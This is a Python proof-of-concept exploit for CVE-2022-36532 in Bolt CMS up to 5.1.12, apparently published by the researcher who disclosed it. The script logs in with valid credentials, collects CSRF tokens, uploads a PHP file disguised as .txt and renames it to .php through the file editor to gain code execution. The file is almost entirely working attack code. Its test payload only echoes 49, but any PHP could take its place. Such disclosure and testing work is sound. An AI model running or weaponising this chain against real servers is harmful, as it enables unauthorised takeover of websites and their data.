#!/usr/bin/env python3
# Date: 12-09-2022
# Author: David MÃ¼ller
# Vendor Homepage: https://boltcms.io/
# Software Link: https://github.com/bolt/core
# Version: <= 5.1.12
# CVE: CVE-2022-36532 (see https://lutrasecurity.com/en/articles/cve-2022-36532/)
# Github: https://github.com/lutrasecurity/CVE-2022-36532


import argparse
import requests
import random
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser(description='Authenticated RCE proof of concept for Bolt CMS <= 5.1.12')
parser.add_argument('username', help='Valid username')
parser.add_argument('password', help='Valid password')
parser.add_argument('URL', help='URL of the Bolt CMS instance')
args = parser.parse_args()


def get_token(regex, response, num):
    token = regex.findall(response)

    try:
        return token[num]
    except:
        print("[!] Could not find token. Aborting")
        exit()

username = args.username
password = args.password
base_url = args.URL.strip("/")

# generate a random name for the file that will be uploaded
random_string = '%030x' % random.randrange(16**30)
payload_filename_txt = random_string + '.txt'
payload_filename_php = random_string + '.php'
php_payload = '<?php $RESULT=7*7; echo $RESULT; ?>'

# Create regex to find csrf and login tokens
login_token_regex = re.compile('name="login\[_token\]" value="(.*)" ')
csrf_token_regex = re.compile('type="hidden" name="_csrf_token" value="(.*)">')

# Create requests session object
session = requests.session()

print("[*] Get login token")
response = session.get(base_url + "/bolt/login")
login_token = get_token(login_token_regex, response.text, 0)

print(f"[*] Attempt login with {username}:{password}")
session.post(base_url + "/bolt/login", data={"login[username]": username, "login[password]": password, "login[remember_me]": "1", "login[_token]": login_token})

print("[*] Get CSRF token")
response = session.get(base_url + "/bolt/filemanager/files")
csrf_token = get_token(csrf_token_regex, response.text, 1)

print(f"[*] Uploading payload to {payload_filename_txt}")
session.post(base_url + "/bolt/async/upload?location=files&path=/",
    headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary1BTdU43mAfylrBf6"},
    data=f"------WebKitFormBoundary1BTdU43mAfylrBf6\r\nContent-Disposition: form-data; name=\"_csrf_token\"\r\n\r\n{csrf_token}\r\n------WebKitFormBoundary1BTdU43mAfylrBf6\r\nContent-Disposition: form-data; filename=\"{payload_filename_txt}\"\r\n\r\n{php_payload}\r\n------WebKitFormBoundary1BTdU43mAfylrBf6--\r\n"
)

print("[*] Get CSRF token")
response = session.get(base_url + f"/bolt/file-edit/files?file=/{payload_filename_txt}")
csrf_token = get_token(csrf_token_regex, response.text, 0)

print(f"[*] Renaming payload file from {payload_filename_txt} to {payload_filename_php}")
session.post(base_url + f"/bolt/file-edit/files?file=/{payload_filename_php}", data={"file": payload_filename_txt, "location": "files", "_csrf_token": csrf_token, "editfile": php_payload, "save": ''})


response = requests.get(base_url + f"/files/{payload_filename_php}")
print()

if int(response.text) == 49:
    print("[+] Bolt CMS instance is vulnerable.")
else:
    print("[-] Bolt CMS instance is not vulnerable.")
